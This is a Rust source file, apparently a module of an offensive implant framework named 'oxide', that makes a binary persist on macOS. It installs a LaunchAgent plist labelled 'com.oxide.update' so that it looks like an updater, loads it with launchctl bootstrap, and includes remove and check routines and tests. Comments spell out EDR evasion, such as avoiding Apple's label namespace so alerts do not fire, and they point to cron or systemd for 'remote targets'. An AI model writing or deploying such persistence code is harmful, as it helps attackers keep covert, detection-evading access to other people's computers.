use crate::persistence::PersistenceTrait;
use std::path::Path;
use std::process::Command;

pub struct LaunchAgentPersistence;
// Use com.oxide.* — never com.apple.* (Apple's namespace triggers EDR alerts)
const LABEL: &str = "com.oxide.update";

fn plist_path() -> anyhow::Result<std::path::PathBuf> {
    let home = std::env::var("HOME").map_err(|_| anyhow::anyhow!("HOME not set"))?;
    Ok(std::path::PathBuf::from(home)
        .join("Library/LaunchAgents")
        .join(format!("{LABEL}.plist")))
}

fn plist_content(binary_path: &Path) -> String {
    // SCOPE: LaunchAgents fire on USER GUI LOGIN only — not on bare system reboot.
    // For headless/remote targets, cron @reboot or systemd is more reliable.
    format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
         <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \
         \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n\
         <plist version=\"1.0\"><dict>\n\
           <key>Label</key><string>{LABEL}</string>\n\
           <key>ProgramArguments</key><array><string>{}</string></array>\n\
           <key>RunAtLoad</key><true/>\n\
           <key>KeepAlive</key><false/>\n\
         </dict></plist>",
        binary_path.display()
    )
}

impl PersistenceTrait for LaunchAgentPersistence {
    fn install(&self, binary_path: &Path) -> anyhow::Result<()> {
        let path = plist_path()?;
        if let Some(dir) = path.parent() { std::fs::create_dir_all(dir)?; }
        std::fs::write(&path, plist_content(binary_path))?;
        // launchctl load/unload deprecated since macOS 10.10.
        // Modern: bootstrap/bootout targeting gui/<uid>.
        let uid = nix::unistd::getuid().as_raw().to_string();
        let domain = format!("gui/{}", uid);
        let plist_str = path.to_str().ok_or_else(|| anyhow::anyhow!("non-UTF-8 plist path"))?;
        let status = Command::new("launchctl")
            .args(["bootstrap", &domain, plist_str])
            .status()?;
        anyhow::ensure!(status.success(), "launchctl bootstrap failed");
        Ok(())
    }

    fn remove(&self) -> anyhow::Result<()> {
        if let Ok(path) = plist_path() {
            let uid = nix::unistd::getuid().as_raw().to_string();
            let domain = format!("gui/{}", uid);
            if let Some(path_str) = path.to_str() {
                let _ = Command::new("launchctl")
                    .args(["bootout", &domain, path_str])
                    .status();
            }
            let _ = std::fs::remove_file(&path);
        }
        Ok(())
    }

    fn check(&self) -> bool { plist_path().map(|p| p.exists()).unwrap_or(false) }
    fn name(&self) -> &'static str { "launch_agent" }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn plist_has_required_keys() {
        let c = plist_content(Path::new("/usr/local/bin/oxide"));
        assert!(c.contains(LABEL) && c.contains("<key>RunAtLoad</key>"));
        assert!(c.contains("<true/>") && c.contains("/usr/local/bin/oxide"));
    }
    #[test]
    fn label_is_not_apple_namespace() {
        assert!(!LABEL.starts_with("com.apple."));
    }
}
